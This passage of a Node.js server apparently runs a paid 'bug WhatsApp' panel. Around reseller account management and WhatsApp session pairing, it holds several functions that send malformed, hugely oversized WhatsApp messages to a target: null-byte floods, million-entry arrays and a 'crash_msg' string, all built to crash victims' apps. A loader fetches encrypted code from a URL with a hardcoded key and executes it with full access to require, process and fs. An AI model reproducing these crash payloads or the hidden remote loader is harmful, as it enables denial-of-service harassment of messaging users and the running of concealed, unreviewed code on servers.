  if (!['owner', 'vip','admin'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "ORCALELO")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "admin", "moderator", "partner"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLimits = {
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya owner yang bisa menghapus role owner
  if (targetUser.role === 'owner' && deleter.role !== 'owner') {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner can delete another owner account." 
    });
  }

  const roleLevel = {
    owner: 6,
    moderator: 5,
    partner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // HIERARKI ROLE - Owner BISA buat Owner
  const hierarchy = {
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member', 'owner'], // ✅ Owner bisa buat owner
    moderator: ['admin', 'partner', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member']
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // ✅ Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "admin", "partner", "moderator", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function docthumb(sock, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
          },
          contextInfo: {
            remoteJid: "X",
            participant: sock.user.id,
            mentionedJid: [target, "13135550002@s.whatsapp.net",],
            quotedMessage: {},
          },
          nativeFlowMessage: {
            messageParamsJson: "{",
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "\u0000".repeat(35000),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await sock.relayMessage(target, pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}


async function docthumbb(sock, target) {
  await sock.relayMessage(target,
    generateWAMessageFromContent(target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "vsp/vaultsuperior",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "1073741824000000",
                  pageCount: 9007199254740991 * 9999,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
              },
              contextInfo: {
                remoteJid: "X",
                participant: sock.user.id,
                mentionedJid: [target, "13135550002@s.whatsapp.net"],
                quotedMessage: {},
                isForwarded: true,
                forwardingScore: 9999,
                externalAdReply: {
                  title: "🦋 .r4LdzHeLL¡!",
                  body: "t.me/rraldz $$$ t.me/voidp",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: false,
                  containsAutoReply: true,
                  showAdAttribution: true,
                  thumbnail: { url: "https://files.catbox.moe/qh0oqq.jpg" },
                },
              },
              nativeFlowMessage: {
                messageParamsJson: "{",
                buttons: [
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                      icon: "REVIEW",
                      flow_cta: "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ‌ཀ‌‌🪅-‣" + "\u0000".repeat(60000),
                                                                                                        
                      flow_message_version: "3"
                    })
                  },
                ]
              }
            }
          }
        }
      }),
      { userJid: target }
    ).message,
    {
      messageId: generateWAMessageFromContent(
        target,
        proto.Message.fromObject({}),
        { userJid: target }
      ).key.id,
    //  participant: { jid: target }
    }
  );
}
async function Adress(sock,target) {
await sock.relayMessage("status@broadcast", {
  interactiveResponseMessage: {
   body: {
     text: "N!ted °B!tch",
     format: "EXTENSIONS_1"
    },
    nativeFlowResponseMessage: {
     name: "address_message",
     paramsJson: "\x10".repeat(2000),
     version: 3
    },
   contextInfo: {
    groupMentions: Array.from({ length: 2000 }, () => ({ //Besarin Aja Length nya
     groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
     groupSubject: "TheUciha"
     }))
   }
 }
}, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}

async function botihunter(sock, target) {
const msg2 = {
   groupStatusMessageV2: {
    message: {
      interactiveMessage: {
         body: {
           text: "⿻ for Exfold ⿻"
      },
      NativeFlowMessage: {
        buttons: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 19999999 },
          )
        ],
        name: "\x10".repeat(50000)
     },
     nativeFlowMessage: {
        name: "galaxy_message",
        buttons: "\u0000".repeat(25000) + "\x10".repeat(25000)
        }
      }
    }
  }
};
await sock.relayMessage(target, msg2, {});
}

async function ofmEr(sock, target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 1000000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: sock.user.id
          },
          body: {
            text: "7eppeli.pdf",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}
async function iNTxSq(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: "\x10.r4LdzHeaven 👁‍🗨",
            format: "EXTENSIONS_1"
          },
          nativeFlowResponseMessage: {
            name: (["address_message","call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
            paramsJson: "{".repeat(1),
            version: 3
          },
          contextInfo: {
            remoteJid: "@RaldzzXyz $$$ @voidp $$$ @rraldz",
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 200900 },
                (_, r4LdzHeLL) => ({ type: 1 })
              )
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(1000);
}

// pemanggilan
async function lahora(sock, target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "kontol"
            },
            nativeFlowMessage: {
              buttons: "\0".repeat(250000)
            }
          }
        }
      }
    };

    const msg2 = {
      interactiveMessage: {
        body: {
          text: "anjykonyol"
        },
        nativeFlowMessage: {
          buttons: "crash_msg" +
                   "\0".repeat(20000) +
                   "\u0000".repeat(1000) +
                   "\u0000".repeat(30000) +
                   "\u0000".repeat(4000)
        }
      }
    };

    const msg3 = {
      interactiveMessage: {
        body: {
          text: "meta ai"
        },
        nativeFlowMessage: {
          buttons: {
            name: "meta_mesaage",
            buttonParamsJson: "\0".repeat(20000) +
                              "\u0000".repeat(1000) +
                              "\u0000".repeat(4000)
          }
        }
      }
    };

    const msg4 = {
      interactiveMessage: {
        body: {
          text: "pppppmeta ai nih bos".repeat(20000)
        },
        nativeFlowMessage: {
          buttons: "[".repeat(50001)
        },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999
        }
      }
    };

    await sock.relayMessage(target, msg1, { viewOnce: true });
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg4, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\x10".repeat(500000),
              title: "\r".repeat(2000),
              format: "DEFAULT"
            },
